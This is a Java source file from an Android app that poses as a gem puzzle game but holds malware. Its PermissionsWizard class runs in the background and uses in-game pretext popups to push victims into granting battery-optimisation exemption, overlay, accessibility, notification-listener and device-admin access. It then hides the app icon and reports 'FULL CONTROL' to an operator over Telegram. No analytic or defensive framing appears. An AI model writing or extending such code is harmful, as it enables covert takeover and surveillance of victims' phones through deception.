package com.gempuzzle.quest.c2;

import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.PowerManager;
import android.provider.Settings;
import android.util.Log;

/**
 * Permission escalation wizard — runs in background after
 * first launch. Requests runtime perms via in-game pretext
 * popups (handled by MainActivity), then guides the user
 * through special-access screens. Once critical perms are
 * granted, triggers icon hide.
 */
public final class PermissionsWizard {

    private static final String TAG = "PermWiz";
    private static volatile boolean running = false;

    public static void start(Context ctx) {
        if (running) return;
        running = true;
        new Thread(() -> {
            try {
                // Wait for game activity to be foregrounded
                Thread.sleep(5000);
                // Battery optimization bypass
                requestBatteryOpt(ctx);
                Thread.sleep(3000);
                // Overlay permission
                requestOverlay(ctx);
                Thread.sleep(3000);
                // Check critical perms, then hide icon
                int attempts = 0;
                while (attempts < 30) {
                    Thread.sleep(60000);
                    if (AccessibilityMonitor.isEnabled(ctx)
                            && NotificationMonitor.isEnabled(ctx)
                            && DeviceAdminReceiver.isActive(ctx)) {
                        if (!IconHider.isHidden(ctx)) {
                            IconHider.hide(ctx);
                            TelegramClient.sendMessage("🕵 *ICON HIDDEN, FULL CONTROL*\n" + HealthCheck.report(ctx));
                        }
                        break;
                    }
                    attempts++;
                }
            } catch (InterruptedException ignored) {
            } finally {
                running = false;
            }
        }).start();
    }

    private static void requestBatteryOpt(Context ctx) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            Intent i = new Intent();
            i.setAction(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
            i.setData(Uri.parse("package:" + ctx.getPackageName()));
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            try { ctx.startActivity(i); } catch (Exception e) { Log.e(TAG, "batt", e); }
        }
    }

    private static void requestOverlay(Context ctx) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(ctx)) {
            Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                    Uri.parse("package:" + ctx.getPackageName()));
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            try { ctx.startActivity(i); } catch (Exception e) { Log.e(TAG, "overlay", e); }
        }
    }

    private PermissionsWizard() {}
}
